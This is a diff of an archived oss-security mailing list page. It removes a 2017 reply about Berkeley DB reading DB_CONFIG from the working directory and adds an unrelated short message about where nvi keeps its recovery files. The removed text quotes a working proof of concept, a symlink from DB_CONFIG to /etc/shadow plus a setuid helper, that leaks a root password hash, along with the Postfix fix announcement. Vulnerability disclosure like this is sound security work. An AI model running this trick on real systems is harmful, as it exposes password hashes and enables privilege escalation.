@@ -1,53 +1,18 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/14/3
-Message-ID: <20170614203826.GA22586@openwall.com>
-Date: Wed, 14 Jun 2017 22:38:26 +0200
-From: Solar Designer <solar@...nwall.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/11/04/1
+Message-Id: <20171104014225.F3F4B17FDCE@rebar.astron.com>
+Date: Fri, 3 Nov 2017 21:42:25 -0400
+From: christos@...las.com (Christos Zoulas)
 To: oss-security@...ts.openwall.com
-Subject: Re: Berkeley DB reads DB_CONFIG from cwd
+Subject: Re: Re: Security risk of server side text editing in general and vim.tiny specifically
 Content-Type: text/plain; charset=utf-8
 
-On Sun, Jun 11, 2017 at 12:06:13AM +0200, Jakub Wilk wrote:
-> Apparently Berkeley DB reads the DB_CONFIG configuration file from the 
-> current working directory by default[*]. This is surprising and AFAICT 
-> undocumented.
-> 
-> Here's how to exploit it against pam_ccreds:
-> 
->    $ cat /etc/shadow
->    cat: /etc/shadow: Permission denied
->    $ ln -sf /etc/shadow DB_CONFIG
->    $ /sbin/ccreds_chkpwd moo < /dev/null
->    BDB1584 line 1: 
->    root:$1$QRCEVRMX$sPppjXE42AZnUPuEWf87D.:17327:0:99999:7:::: incorrect 
->    name-value pair
-> 
-> (The above was tested on Debian jessie.)
-> 
-> In the past, nss_db was also exploitable:
-> CVE-2010-0826
-> 
-> 
-> [*] More precisely, this seem to happen when you call db_create() with 
-> dbenv=NULL; or if you use the dbm_open() function.
+On Nov 3, 11:12am, itz@...y.loosely.org (Ian Zimmerman) wrote:
+-- Subject: [oss-security] Re: Security risk of server side text editing in g
 
-Postfix "3.2.2 and legacy releases 3.1.6, 3.0.10 and 2.11.10" were
-released working around this issue:
+| How much of this (and the parallel thread of course) applies to nvi?
 
-http://www.postfix.org/announcements/postfix-3.2.2.html
- 
-  * Security: Berkeley DB versions 2 and later try to read settings
-    from a file DB_CONFIG in the current directory. This undocumented
-    feature may introduce undisclosed vulnerabilities resulting in
-    privilege escalation with Postfix set-gid programs (postdrop,
-    postqueue) before they chdir to the Postfix queue directory,
-    and with the postmap and postalias commands depending on whether
-    the user's current directory is writable by other users. This
-    fix does not change Postfix behavior for Berkeley DB versions
-    < 3, but it does reduce postmap and postalias 'create' performance
-    with Berkeley DB versions 3.0 .. 4.6.
+Nvi stores the recovery files in /var/tmp/vi.recover/ owned by the user,
+mode 600.
 
-The corresponding change log entry is from June 11 - looks like same day
-as Jakub's posting.
-
-Alexander
+christos
